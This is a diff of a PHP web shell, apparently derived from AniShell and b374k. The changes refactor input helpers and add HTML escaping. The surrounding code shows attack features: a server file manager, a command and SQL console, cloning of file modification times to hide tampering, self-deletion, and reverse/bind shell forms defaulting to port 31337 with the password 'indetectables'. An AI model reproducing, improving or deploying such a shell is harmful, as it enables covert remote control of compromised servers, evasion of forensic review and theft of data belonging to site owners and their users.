@@ -12,7 +12,7 @@ $config['date'] = 'd/m/Y';
 $config['datetime'] = 'd/m/Y H:i:s';
 $config['hd_lines'] = 16;   //lines in hex preview file
 $config['hd_rows'] = 32;    //16, 24 or 32 bytes in one line
-$config['FMLimit'] = 50;   //file manager item limit. false = No limit
+$config['FMLimit'] = 100;   //file manager item limit. false = No limit
 $config['SQLLimit'] = 50;   //sql manager result limit.
 $config['checkBDel'] = true;//Check Before Delete: true = On 
 $config['consNames'] = array('post'=>'dsr', 'slogin'=>'cccpshell', 'sqlclog'=>'conlog'); //Constants names
@@ -78,22 +78,19 @@ function mLink($t, $o, $e = '', $m = true){
 	return "<a href='#' onclick='$o' $e>$t</a>";
 }
 
-function mInput($arg){
-	$arg['v'] = (isset($arg['v']) ? $arg['v'] : '');
-	$arg['e'] = (isset($arg['e']) ? $arg['e'] : '');
-	$arg['c'] = (isset($arg['c']) ? $arg['c'] : '');
-	$arg['tt'] = (isset($arg['tt']) ? $arg['tt'].'<br>' : '');
-	if (isset($arg['nl']))
-		return "<p>$arg[tt]<input class='$arg[c]' name='$arg[n]' id='$arg[n]' value='$arg[v]' type='text' $arg[e] /></p>";
+function mInput($n, $v, $tt = '', $nl = '', $c = '', $e = ''){
+	if ($tt !== '') $tt = "$tt<br>"; 
+	if ($nl !== '')
+		return "<p>$tt<input class='$c' name='$n' id='$n' value='$v' type='text' $e /></p>";
 	else
-		return "$arg[tt]<input class='$arg[c]' name='$arg[n]' id='$arg[n]' value='$arg[v]' type='text' $arg[e] />";
+		return "$tt<input class='$c' name='$n' id='$n' value='$v' type='text' $e />";
 }
 
-function mSubmit($v, $o, $nl = false){
-	if (isset($nl))
-		return "<p><input class='button' type='button' value='$v' onclick='$o;return false;'></p>";
+function mSubmit($v, $o, $nl = '', $e = ''){
+	if ($nl !== '')
+		return "<p><input class='button' type='button' value='$v' onclick='$o;return false;' $e ></p>";
 	else
-		return "<input class='button' type='button' value='$v' onclick='$o;return false;'>";
+		return "<input class='button' type='button' value='$v' onclick='$o;return false;' $e >";
 }
 
 function mSelect($n, $v, $nk = false, $s = false, $o = false, $t = false, $nl = false, $e = false){
@@ -208,15 +205,15 @@ function getSelf(){
 	return $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
 }
 
-function tText($id, $default){
+function tText($id, $def){
 	
 	if (isset($lang[$id])) return $lang[$id];
-	else return $default;
+	else return $def;
 }
 
-function showIcon($file){
+function showIcon($f){
 	$image = 'unk';
-	$file = strtolower(substr(strrchr($file, '.'), 1));
+	$f = strtolower(substr(strrchr($f, '.'), 1));
 	$img = array('htaccess', 'asp', 'cgi', 'php', 'html', 'jpg', 'js', 'swf', 'txt',
 	 'tar', 'mp3', 'avi', 'cmd', 'cpp', 'ini', 'doc', 'exe', 'log', 'pl', 'py', 'xml');
 
@@ -236,10 +233,10 @@ function showIcon($file){
       'htaccess' => array('htaccess', 'htpasswd', 'ht', 'hta', 'so') 
 	);
 
-	if (in_array($file, $img)) $image = $file;
+	if (in_array($f, $img)) $image = $f;
 	if ($image === 'unk'){
 		foreach ($imgEquals as $k => $v){
-			if (in_array($file, $v)){
+			if (in_array($f, $v)){
 				$image = $k;
 				break;
 			}
@@ -251,7 +248,8 @@ function showIcon($file){
 
 # General functions
 function hsc($s){
-	return htmlspecialchars($s, 2|1);
+	//return htmlspecialchars($s, 2|1);
+	return htmlentities($s);
 }
 
 function execute($c, $i = false){
@@ -332,31 +330,31 @@ function safeStatus(){
     return $safe_mode;
 }
 
-function getfun($funName){
-    return (false !== function_exists($funName)) ? tText('yes', 'yes') : tText('no', 'no');
+function getfun($n){
+    return (false !== function_exists($n)) ? tText('yes', 'yes') : tText('no', 'no');
 }
 
-function getcfg($varname){
-    $result = get_cfg_var($varname);
+function getcfg($n){
+    $result = get_cfg_var($n);
     if ($result == 0) return tText('no', 'no');
     elseif ($result == 1) return tText('yes', 'yes');
     else return $result;
 }
 
-function sizecount($size){
-	if ($size[0] === '*') return $size;
+function sizecount($s){
+	if ($s[0] === '*') return $s;
 	$sizename = array(' B', ' KB', ' MB', ' GB', ' TB', ' PB', ' EB', ' ZB', ' YB');
-	return @round( $size / pow(1024, ($i = floor(log($size, 1024)))), 2) . $sizename[$i];
+	return @round( $s / pow(1024, ($i = floor(log($s, 1024)))), 2) . $sizename[$i];
 }
 
-function getPath($scriptpath, $nowpath){
-    if ($nowpath === '.') $nowpath = $scriptpath;
-    if (substr($nowpath, -1) !== DS) $nowpath = $nowpath . DS;
-    return $nowpath;
+function getPath($s, $n){
+    if ($n === '.') $n = $s;
+    if (substr($n, -1) !== DS) $n = $n . DS;
+    return $n;
 }
 
-function getUpPath($nowpath){
-    $pathdb = explode(DS, $nowpath);
+function getUpPath($n){
+    $pathdb = explode(DS, $n);
     $num = count($pathdb);
     if ($num > 2) unset($pathdb[$num - 1], $pathdb[$num - 2]);
     $uppath = implode(DS, $pathdb) . DS;
@@ -448,19 +446,19 @@ class PHPZip {
         return 1;
     }
 
-    function unix2DosTime($unixtime = 0){
-        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
-        if ($timearray['year'] < 1980) $timearray = array('year' => 1980, 'mon' => 1, 'mday' => 1, 'hours' => 0, 'minutes' => 0, 'seconds' => 0);
-        return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) | ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
+    function unix2DosTime($t = 0){
+        $ta = ($t == 0) ? getdate() : getdate($t);
+        if ($ta['year'] < 1980) $ta = array('year' => 1980, 'mon' => 1, 'mday' => 1, 'hours' => 0, 'minutes' => 0, 'seconds' => 0);
+        return (($ta['year'] - 1980) << 25) | ($ta['mon'] << 21) | ($ta['mday'] << 16) | ($ta['hours'] << 11) | ($ta['minutes'] << 5) | ($ta['seconds'] >> 1);
     }
 	
-	function hex2bin($str){
+	function hex2bin($s){
 		$bin = '';
 		$i = 0;
 		do {
-			$bin .= chr(hexdec($str{$i}.$str{($i + 1)}));
+			$bin .= chr(hexdec($s{$i}.$s{($i + 1)}));
 			$i += 2;
-		} while ($i < strlen($str));
+		} while ($i < strlen($s));
 		return $bin;
 	}
 
@@ -893,7 +891,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 				drag_stop();
 		}, false);
 
-		//if ($(\'.box input\')[0]) $(\'.box input\')[0].focus();
+		if (d.getElementById("uival")) d.getElementById("uival").focus();
 	}
 
 	function hide_box(){
@@ -969,7 +967,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 			if (a === "cfile") title = "' . tText('createfile', 'Create file') . '";
 		}
 	
-		ct = "<table class=\'boxtbl\'><tr><td class=\'colFit\'>" + text + "</td><td><input id=\'uival\' name=\'uival\' type=\'text\' value=\'" + path + "\' " + disabled + "></td></tr><tr data-path=\'" + datapath + "\'><td colspan=\'2\'><span class=\'button\' onclick=\'processUI(&quot;" + a + "&quot;, dpath(this, false), d.getElementById(&quot;uival&quot;).value);\'>" + btitle + "</span></td></tr></table>";
+		ct = "<table class=\'boxtbl\'><tr><td class=\'colFit\'>" + text + "</td><td>' . mInput('uival', '" + path + "', '', '', '', '" + disabled + "') . '</td></tr><tr data-path=\'" + datapath + "\'><td colspan=\'2\'><span class=\'button\' onclick=\'processUI(&quot;" + a + "&quot;, dpath(this, false), d.getElementById(&quot;uival&quot;).value);\'>" + btitle + "</span></td></tr></table>";
 		show_box(title, ct);
 	}	
 	
@@ -984,7 +982,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 			title = "' . tText('download', 'Download') . '";
 		} else if (a === "copy"){
 			title = "' . tText('copy', 'Copy') . '";
-			uival = "<tr><td class=\'colFit\'>' . tText('to', 'To') . '</td><td><input id=\'uival\' name=\'uival\' type=\'text\' value=\'\'></td></tr>";
+			uival = "<tr><td class=\'colFit\'>' . tText('to', 'To') . '</td><td>' . mInput('uival', '') . '</td></tr>";
 			n = "d.getElementById(&quot;uival&quot;).value";
 		} else if (a === "rdel"){
 			title = "' . tText('del', 'Del') . '";
@@ -1217,7 +1215,6 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 			border: 1px solid #800000;
 			border-radius: 6px 6px 6px 6px;
 			margin: 4px 0;
-			padding: 8px;
 			width: 100%;
 		}
 		.explore{
@@ -1782,7 +1779,7 @@ if (isset($p['me']) && $p['me'] === 'file'){
 							}
 						}
 					}
-					sAjax(tText('total', 'Total') . ': ' . $total . ' [' . tText('correct', 'correct') . ' ' . ($total - count($fNames)) . ' - ' . tText('failed', 'failed') . ' '. count($fNames) . (count($fNames) == 0 ? '' : ' (' . implode(', ', $fNames) . ')') . ']');
+					sAjax(hsc(tText('total', 'Total') . ': ' . $total . ' [' . tText('correct', 'correct') . ' ' . ($total - count($fNames)) . ' - ' . tText('failed', 'failed') . ' '. count($fNames) . (count($fNames) == 0 ? '' : ' (' . implode(', ', $fNames) . ')') . ']'));
 				}
 				break;
 			case 'del':
@@ -1857,7 +1854,7 @@ if (isset($p['me']) && $p['me'] === 'file'){
 		if (file_exists($p['t'])){
 			$sBuff .= '<h2>' . tText('information', 'Information') . ' [' . mLink(tText('goback', 'Go Back'), 'ajaxLoad("me=file&dir=' . rawurlencode(getUpPath($p['t'])) . '")') . ']</h2>
 					 <table border=0 cellspacing=1 cellpadding=2>
-					 <tr><td><b>' . tText('path', 'Path') . '</b></td><td>' . $p['t'] . '</td></tr>
+					 <tr><td><b>' . tText('path', 'Path') . '</b></td><td>' . hsc($p['t']) . '</td></tr>
 					 <tr><td><b>' . tText('size', 'Size') . '</b></td><td>' . sizecount(filesize($p['t'])) . '</td></tr>
 					 <tr><td><b>' . tText('md5', 'MD5') . '</b></td><td>' . strtoupper(@md5_file($p['t'])) . '</td></tr>
 					 <tr><td><b>' . tText('sha1', 'SHA1') . '</b></td><td>' . strtoupper(@sha1_file($p['t'])) . '</td></tr>
@@ -1952,26 +1949,25 @@ if (isset($p['me']) && $p['me'] === 'file'){
 	} elseif (@$p['md'] === 'edit'){
 		if (file_exists($p['t'])){
 			$filemtime = explode('-', @date('Y-m-d-H-i-s', filemtime($p['t'])));
-		
 			$sBuff .= '<h2>' . tText('edit', 'Edit') . ' [' . mLink(tText('goback', 'Go Back'), 'ajaxLoad("me=file&dir=' . rawurlencode(getUpPath($p['t'])) . '")') . ']</h2>
 					<div class="alt1 stdui"><form name="cldate">
 						' . mHide('me', 'file') . mHide('md', 'tools') . mHide('ac', 'mdatec') . '
 						<h3>' . tText('e1', 'Clone folder/file last modified time') . '</h3>
-						' . mInput(array('n'=>'a', 'v'=>$p['t'], 'tt'=>tText('e2', 'Alter folder/file'), 'nl'=>'', 'e'=>'style="width: 99%;" disabled')) . '
-						' . mInput(array('n'=>'b', 'tt'=>tText('e3', 'Reference folder/file (fullpath)'), 'nl'=>'', 'e'=>'style="width: 99%;"')) . '
+						' . mInput('a', $p['t'], tText('e2', 'Alter folder/file'), 1, '', 'style="width: 99%;" disabled') . '
+						' . mInput('b', '', tText('e3', 'Reference folder/file (fullpath)'), 1, '', 'style="width: 99%;"') . '
 						' . mSubmit(tText('go', 'Go!'), 'uiupdate(0)') . '
 					</form></div><br><br>
 					<div class="alt1 stdui"><form name="chdate">
 						' . mHide('me', 'file') . mHide('md', 'tools') . mHide('ac', 'mdate') . '
 						<h3>' . tText('e4', 'Set last modified time') . '</h3>
-						' . mInput(array('n'=>'a', 'v'=>$p['t'], 'tt'=>tText('e5', 'Current folder/file (fullpath)'), 'nl'=>'', 'e'=>'style="width: 99%;" disabled')) . '
+						' . mInput('a', $p['t'], tText('e5', 'Current folder/file (fullpath)'), 1, '', 'style="width: 99%;" disabled') . '
 						<p>
-							' . tText('year', 'year') . ': ' . mInput(array('n'=>'y', 'v'=>$filemtime[0], 'e'=>'size="4"')) . '
-							' . tText('month', 'month') . ': ' . mInput(array('n'=>'m', 'v'=>$filemtime[1], 'e'=>'size="2"')) . '
-							' . tText('day', 'day') . ': ' . mInput(array('n'=>'d', 'v'=>$filemtime[2], 'e'=>'size="2"')) . '
-							' . tText('hour', 'hour') . ': ' . mInput(array('n'=>'h', 'v'=>$filemtime[3], 'e'=>'size="2"')) . '
-							' . tText('minute', 'minute') . ': ' . mInput(array('n'=>'m', 'v'=>$filemtime[4], 'e'=>'size="2"')) . '
-							' . tText('second', 'second') . ': ' . mInput(array('n'=>'s', 'v'=>$filemtime[5], 'e'=>'size="2"')) . '
+							' . tText('year', 'year') . ': ' . mInput('y', $filemtime[0], '', '', '', 'size="4"') . '
+							' . tText('month', 'month') . ': ' . mInput('m', $filemtime[1], '', '', '', 'size="2"') . '
+							' . tText('day', 'day') . ': ' . mInput('d', $filemtime[2], '', '', '', 'size="2"') . '
+							' . tText('hour', 'hour') . ': ' . mInput('h', $filemtime[3], '', '', '', 'size="2"') . '
+							' . tText('minute', 'minute') . ': ' . mInput('m', $filemtime[4], '', '', '', 'size="2"') . '
+							' . tText('second', 'second') . ': ' . mInput('s', $filemtime[5], '', '', '', 'size="2"') . '
 						</p>
 						' . mSubmit(tText('go', 'Go!'), 'uiupdate(1)') . '
 					</form></div><br><br>';
@@ -2025,8 +2021,8 @@ if (isset($p['me']) && $p['me'] === 'file'){
 			  <tr>
 					<td nowrap>' . tText('acdir', 'Current directory') . ' [' . (@is_writable($currentdir) ? tText('writable', 'Writable') : tText('no', 'No') . ' ' . tText('writable', 'Writable')) . ($isWIN ? '' : ', ' . getChmod($currentdir)) . ']: </td>
 					<td width="100%"><span id="sgoui" class="hide"><div class="image dir" onclick="change(\'sgoui\', \'lnks\')"></div>&nbsp;
-					&nbsp;<input id="goui" name="goui" value="' . $currentdir . '" type="text" size="100%">
-					&nbsp;' . mSubmit(tText('go', 'Go!'), 'godirui()') . '</span><span id="lnks"><div class="image edit" onclick="change(\'lnks\', \'sgoui\')"></div>&nbsp;'. $lnks .'</span></td>
+					&nbsp;' . mInput('goui', $currentdir, '', '', '', 'size="100%"') . '
+					&nbsp;' . mSubmit(tText('go', 'Go!'), 'godirui()', '', 'style="width: 5px;display: inline;"') . '</span><span id="lnks"><div class="image edit" onclick="change(\'lnks\', \'sgoui\')"></div>&nbsp;'. $lnks .'</span></td>
 			  </tr>
 			</table>		
 			<tr class="alt1"><td colspan="7" style="padding:5px;">';
@@ -2202,7 +2198,7 @@ if (isset($p['me']) && $p['me'] === 'srm'){
 	$r = mt_rand(1337, 9999);
 	$sBuff .= '<form><b>' . tText('del', 'Del') . ': ' . __file__ . '<br><br>' . tText('reminfo', 'For confirmation enter this code') . ': ' . $r . '</b> 
 			' . mHide('me', 'srm') . mHide('rc', $r) . '
-			<input type="text" name="uc">&nbsp;&nbsp;&nbsp;<input type="button" value="' . tText('go', 'Go!') . '" onclick="ajaxLoad(serialize(d.forms[0]));return false;" />
+			' . mInput('uc', '') . '&nbsp;&nbsp;&nbsp;<input type="button" value="' . tText('go', 'Go!') . '" onclick="ajaxLoad(serialize(d.forms[0]));return false;" />
 			</form>';
 }
 
@@ -2492,7 +2488,7 @@ if (isset($p['me']) && $p['me'] === 'sql'){
 			}
 
 			$sBuff .= '</td>
-				<td id="dbRes" style="vertical-align:top;width:100%;"></td>
+				<td id="dbRes" style="vertical-align:top;width:100%;padding:0 10px;"></td>
 				</tr></tbody></table>';
 			if (isset($p['sqlinit'])) $sBuff .= mHide('jseval', 'dbhistory("s");');
 			
@@ -2517,10 +2513,10 @@ if (isset($p['me']) && $p['me'] === 'sql'){
 				</div>
 				<div class="table-row" style="text-align:left;">
 					<div class="table-col"><form>' .
-					mInput(array('n'=>'host', 'tt'=>'<span id="sh">' . tText('sq7', 'Host') . '</span>', 'nl'=>'', 'e'=>'style="width: 99%;"')) . 
-					'<span id="su">' . mInput(array('n'=>'user', 'tt'=>tText('sq0', 'Username'), 'nl'=>'', 'e'=>'style="width: 99%;"'))  . '</span>' . 
-					'<span id="sp">' . mInput(array('n'=>'pass', 'tt'=>tText('sq1', 'Password'), 'nl'=>'', 'e'=>'style="width: 99%;"'))  . '</span>' . 
-					'<span id="so">' . mInput(array('n'=>'port', 'tt'=>tText('sq2', 'Port (optional)'), 'nl'=>'', 'e'=>'style="width: 99%;"')) . '</span>' .
+					mInput('host', '', '<span id="sh">' . tText('sq7', 'Host') . '</span>', 1, '', 'style="width: 99%;"') . 
+					'<span id="su">' . mInput('user', '', tText('sq0', 'Username'), 1, '', 'style="width: 99%;"')  . '</span>' . 
+					'<span id="sp">' . mInput('pass', '', tText('sq1', 'Password'), 1, '', 'style="width: 99%;"')  . '</span>' . 
+					'<span id="so">' . mInput('port', '', tText('sq2', 'Port (optional)'), 1, '', 'style="width: 99%;"') . '</span>' .
 					mSelect('type', $sqllist, false, false, 'dbengine(this)', tText('sq3', 'Engine')) . 
 					mHide('me', 'sql') . mHide('sqlinit', 'init') . mHide('jseval', 'dbengine(d.getElementById("type"));dbhistory("v");') . 
 					'<center>' . mSubmit(tText('go', 'Go!'), 'ajaxLoad(serialize(d.forms[0]));', 1) . '</center>' .
@@ -2626,14 +2622,14 @@ if (isset($p['me']) && $p['me'] === 'connect'){ //Basada en AniShell
 			</div>
 			<div class="table-row" style="text-align:left;">
 				<div class="table-col"><form>
-				' . mInput(array('n'=>'ip', 'v'=>$_SERVER['REMOTE_ADDR'], 'tt'=>tText('bc2', 'IP'), 'nl'=>'')) . '
-				' . mInput(array('n'=>'port', 'v'=>'31337', 'tt'=>tText('bc3', 'Port'), 'nl'=>'')) . '
+				' . mInput('ip', $_SERVER['REMOTE_ADDR'], tText('bc2', 'IP'), 1) . '
+				' . mInput('port', '31337', tText('bc3', 'Port'), 1) . '
 				' . mSelect('mode', array('PHP'), 1, 0, 0, tText('bc4', 'Mode')) . '
 				' . mSubmit(tText('bc6', 'Listen'), 'uiupdate(0)', 1) . '
 				</form></div>
 				<div class="table-col"><form>
-				' . mInput(array('n'=>'port', 'v'=>'31337', 'tt'=>tText('bc3', 'Port'), 'nl'=>'')) . '
-				' . mInput(array('n'=>'passwd', 'v'=>'indetectables', 'tt'=>tText('bc5', 'Password'), 'nl'=>'')) . '
+				' . mInput('port', '31337', tText('bc3', 'Port'), 1) . '
+				' . mInput('passwd', 'indetectables', tText('bc5', 'Password'), 1) . '
 				' . mSelect('mode', array('PHP', 'Python'), 1, 0, 0, tText('bc4', 'Mode')) . '
 				' . mSubmit(tText('bc7', 'Bind'), 'uiupdate(1)', 1) . '
 				</form></div>
@@ -2691,14 +2687,13 @@ if (isset($p['me']) && $p['me'] === 'execute'){
 }
 
 if (isset($p['me']) && $p['me'] === 'info'){
-    if (@sValid($p['phpvarname'])) $sBuff .= sDialog($p['phpvarname'] . ': ' . getcfg($p['phpvarname']));
-    $sBuff .= '<form> 
-        <h2>Variables del servidor</h2> 
-        <p>Ingrese los parametros PHP de configuracion (ej: magic_quotes_gpc)
-        <input name="phpvarname" id="phpvarname" value="" type="text" size="100" /> <input name="submit" id="submit" type="submit" value="Submit"></p> 
+    if (isset($p['pvn'])) $sBuff .= sAjax($p['pvn'] . ': ' . getcfg($p['pvn']));
+    $sBuff .= '<form>' . mHide('me', 'info') . '
+        <h2>' . tText('info', 'Info') . '</h2> 
+        <p>' . tText('in0', 'PHP config param (ex: magic_quotes_gpc)') . '
+        ' . mInput('pvn', '') . ' ' . mSubmit(tText('go', 'Go!'), 'uiupdate(0)', '', 'style="width: 5px;display: inline;"') . '</p> 
         </form>';
-		
-		
+	
 	//principal resume
 	$dis_func = get_cfg_var('disable_functions');
     !$dis_func && $dis_func = 'No';
@@ -2743,9 +2738,8 @@ if (isset($p['me']) && $p['me'] === 'info'){
 		$sBuff .= "<tr><td>$v</td><td>$k</td></tr>";
 	
 	$sBuff .= "</table></div>";
-		
-	//based on b374k work	
-	//server misc info
+	
+	//server misc info - based on b374k work
 	$sBuff .= "<p class='boxtitle touch' onclick=\"toggle('info_server');\" style='margin-bottom:8px;'>Server Info</p>" .
 		"<div id='info_server' style='margin-bottom:8px;display:none;'><table class='dataView'>";
 	if ($isWIN){
